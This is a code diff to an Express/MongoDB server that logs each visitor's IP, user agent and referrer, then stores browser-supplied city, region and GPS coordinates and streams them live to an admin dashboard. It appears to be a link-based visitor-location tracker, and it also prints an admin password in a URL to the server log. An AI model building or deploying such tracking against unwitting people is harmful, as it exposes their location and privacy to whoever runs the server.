@@ -22,141 +22,90 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(cookieParser());
 
-// ─── Log ALL incoming requests ────────────────────────────────
+// ─── Log all requests ─────────────────────────────────────────
 app.use((req, res, next) => {
-  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
-  console.log(`[REQ] ${req.method} ${req.path} | IP: ${ip}`);
+  console.log(`[REQ] ${req.method} ${req.path}`);
   next();
 });
 
-// ─── MongoDB Connection ───────────────────────────────────────
+// ─── MongoDB ──────────────────────────────────────────────────
 mongoose.connect(process.env.MONGO_URI)
   .then(() => console.log('✅ MongoDB connected'))
   .catch(err => { console.error('❌ MongoDB:', err.message); process.exit(1); });
 
-// ─── IP Geolocation ───────────────────────────────────────────
-async function getGeoData(ip) {
-  // Try ip-api first
-  try {
-    const res = await fetch(
-      `http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,timezone,query`,
-      { signal: AbortSignal.timeout(5000) }
-    );
-    const geo = await res.json();
-    if (geo.status === 'success') {
-      console.log(`[GEO] ip-api success: ${geo.city}, ${geo.country}`);
-      return geo;
-    }
-    console.log(`[GEO] ip-api failed: ${geo.message}`);
-  } catch (e) {
-    console.log(`[GEO] ip-api error: ${e.message}`);
-  }
-
-  // Fallback: freeipapi
-  try {
-    const res = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: AbortSignal.timeout(5000) });
-    const geo = await res.json();
-    if (geo.ipAddress) {
-      console.log(`[GEO] freeipapi success: ${geo.cityName}, ${geo.countryName}`);
-      return {
-        query:       geo.ipAddress,
-        country:     geo.countryName,
-        countryCode: geo.countryCode,
-        regionName:  geo.regionName,
-        city:        geo.cityName,
-        zip:         geo.zipCode     || '',
-        lat:         geo.latitude,
-        lon:         geo.longitude,
-        isp:         geo.asnOrganization || '',
-        org:         geo.asnOrganization || '',
-        timezone:    geo.timeZones?.[0]  || ''
-      };
-    }
-  } catch (e) {
-    console.log(`[GEO] freeipapi error: ${e.message}`);
-  }
-
-  console.log(`[GEO] All providers failed for IP: ${ip}`);
-  return null;
-}
-
-// ─── Debug Route ──────────────────────────────────────────────
+// ─── Debug ────────────────────────────────────────────────────
 app.get('/debug', async (req, res) => {
-  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
-    .split(',')[0].trim().replace('::ffff:', '');
-  const geo   = await getGeoData(ip);
   const count = await Visitor.countDocuments();
   const last  = await Visitor.findOne().sort({ timestamp: -1 }).lean();
-  res.json({ ip, geo, mongoConnected: true, visitorCount: count, lastVisitor: last });
+  res.json({ mongoConnected: true, visitorCount: count, lastVisitor: last });
 });
 
-// ─── Tracking Route ───────────────────────────────────────────
+// ─── Step 1: User visits page ─────────────────────────────────
+// Save a "pending" record immediately with NO location data.
+// The browser will fill in the real location via /api/update-location.
 app.get('/', async (req, res) => {
-  console.log('[TRACK] / route hit');
-
   // Serve page immediately
   res.sendFile(path.resolve(PUBLIC_DIR, 'index.html'));
 
-  // Save visitor in background
-  try {
-    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
-      .split(',')[0].trim().replace('::ffff:', '');
+  // Save minimal record in background — NO IP lookup, NO geo guessing
+  setImmediate(async () => {
+    try {
+      const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
+        .split(',')[0].trim().replace('::ffff:', '');
 
-    console.log(`[TRACK] IP detected: ${ip}`);
+      const visitorData = {
+        sessionId: crypto.randomUUID(),
+        ip,
+        city:      'Pending...',
+        region:    'Pending...',
+        country:   'Pending...',
+        userAgent: req.headers['user-agent'] || '',
+        referer:   req.headers['referer']    || 'direct',
+        timestamp: new Date()
+      };
 
-    const geo = await getGeoData(ip);
+      const visitor = await Visitor.create(visitorData);
+      console.log(`[VISIT] New visitor saved | ID: ${visitor._id} | IP: ${ip}`);
 
-    const visitorData = {
-      sessionId:   crypto.randomUUID(),
-      ip:          geo?.query       || ip,
-      country:     geo?.country     || 'Unknown',
-      countryCode: geo?.countryCode || '',
-      region:      geo?.regionName  || 'Unknown',
-      city:        geo?.city        || 'Unknown',
-      zip:         geo?.zip         || '',
-      lat:         geo?.lat         ?? null,
-      lon:         geo?.lon         ?? null,
-      isp:         geo?.isp         || '',
-      org:         geo?.org         || '',
-      timezone:    geo?.timezone    || '',
-      userAgent:   req.headers['user-agent'] || '',
-      referer:     req.headers['referer']    || 'direct',
-      timestamp:   new Date()
-    };
+      // Notify admin of new pending visitor
+      io.to('admins').emit('new_visitor', { ...visitorData, _id: visitor._id });
 
-    console.log(`[TRACK] Saving to MongoDB...`);
-    const visitor = await Visitor.create(visitorData);
-    console.log(`[TRACK] ✅ Saved! ID: ${visitor._id} | ${visitorData.city}, ${visitorData.country}`);
-
-    io.to('admins').emit('new_visitor', { ...visitorData, _id: visitor._id });
-
-  } catch (err) {
-    console.error(`[TRACK] ❌ Error: ${err.message}`);
-    console.error(err.stack);
-  }
+    } catch (err) {
+      console.error('[VISIT] Save error:', err.message);
+    }
+  });
 });
 
-// ─── GPS Update Route ─────────────────────────────────────────
-// Called from browser after GPS + BigDataCloud reverse geocoding
-// Updates visitor record with EXACT coordinates AND real city name
+// ─── Step 2: Browser sends real location ──────────────────────
+// BigDataCloud JS client resolves city/country in the browser
+// (via GPS if allowed, or its own IP lookup as fallback)
+// then POSTs the result here. We update the visitor record.
 app.post('/api/update-location', async (req, res) => {
   try {
-    const { lat, lon, accuracy, city, region, country, countryCode, zip } = req.body;
+    const {
+      lat, lon, city, region, country,
+      countryCode, zip, lookupSource
+    } = req.body;
+
     const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
       .split(',')[0].trim().replace('::ffff:', '');
 
-    if (!lat || !lon) return res.json({ success: false, reason: 'no coords' });
+    console.log(`[LOC] Received from browser: ${city}, ${region}, ${country} | source: ${lookupSource} | IP: ${ip}`);
 
-    // Build update — only overwrite fields that came back from GPS geocoding
+    if (!city && !country) {
+      return res.json({ success: false, reason: 'no location data received' });
+    }
+
     const update = {
-      lat: parseFloat(lat),
-      lon: parseFloat(lon)
+      city:        city        || 'Unknown',
+      region:      region      || 'Unknown',
+      country:     country     || 'Unknown',
+      countryCode: countryCode || '',
+      zip:         zip         || '',
+      lookupSource: lookupSource || 'unknown'
     };
-    if (city)        update.city        = city;
-    if (region)      update.region      = region;
-    if (country)     update.country     = country;
-    if (countryCode) update.countryCode = countryCode;
-    if (zip)         update.zip         = zip;
+    if (lat) update.lat = parseFloat(lat);
+    if (lon) update.lon = parseFloat(lon);
 
     const visitor = await Visitor.findOneAndUpdate(
       { ip },
@@ -165,24 +114,29 @@ app.post('/api/update-location', async (req, res) => {
     );
 
     if (visitor) {
-      console.log(`[GPS] ✅ Updated ${ip} → ${city}, ${region}, ${country} | coords: ${lat}, ${lon} (±${accuracy}m)`);
+      const source = lookupSource === 'reverseGeocoding' ? '📡 GPS' : '🌐 BigDataCloud IP';
+      console.log(`[LOC] ✅ Updated → ${city}, ${region}, ${country} [${source}]`);
+
       io.to('admins').emit('location_updated', {
-        _id: visitor._id,
-        lat: visitor.lat,
-        lon: visitor.lon,
-        city: visitor.city,
-        region: visitor.region,
-        country: visitor.country,
+        _id:         visitor._id,
+        lat:         visitor.lat,
+        lon:         visitor.lon,
+        city:        visitor.city,
+        region:      visitor.region,
+        country:     visitor.country,
         countryCode: visitor.countryCode,
-        zip: visitor.zip
+        zip:         visitor.zip,
+        lookupSource
       });
+
       return res.json({ success: true });
     }
 
-    console.log(`[GPS] No visitor found for IP: ${ip}`);
+    console.log(`[LOC] No visitor found for IP: ${ip}`);
     res.json({ success: false, reason: 'visitor not found' });
+
   } catch (err) {
-    console.error('[GPS] Update error:', err.message);
+    console.error('[LOC] Error:', err.message);
     res.status(500).json({ success: false });
   }
 });
@@ -211,9 +165,9 @@ io.on('connection', (socket) => {
   });
 });
 
-// ─── Start Server ─────────────────────────────────────────────
+// ─── Start ────────────────────────────────────────────────────
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-  console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`📊 Admin: /admin?password=${process.env.ADMIN_PASSWORD}`);
+  console.log(`\n🚀 Server on port ${PORT}`);
+  console.log(`📊 Admin: /admin?password=${process.env.ADMIN_PASSWORD}\n`);
 });
